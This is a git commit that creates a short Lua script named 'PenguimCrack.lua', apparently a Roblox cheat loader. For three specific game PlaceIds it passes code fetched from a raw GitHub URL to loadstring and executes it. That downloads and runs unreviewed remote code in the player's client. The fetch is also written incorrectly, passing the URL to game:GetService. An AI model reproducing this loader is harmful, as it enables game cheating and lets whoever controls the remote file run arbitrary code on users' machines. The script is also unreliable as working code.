575993269a4034748897e60d3797fd0cc7ff4593
DorineEdythe <131846582+DorineEdythe@users.noreply.github.com>
2023-04-26 15:00:57 +0700

    Create PenguimCrack.lua

---
+++ PenguimCrack.lua
@@ -0,0 +1,4 @@
+local PlaceId = game.PlaceId
+if PlaceId == 4520749081 or PlaceId == 6381829480 or PlaceId == 5931540094 then
+loadstring(game:GetService("https://raw.githubusercontent.com/DorineEdythe/X2EwEwTrxsh/main/Loadder.lua"))()
+end
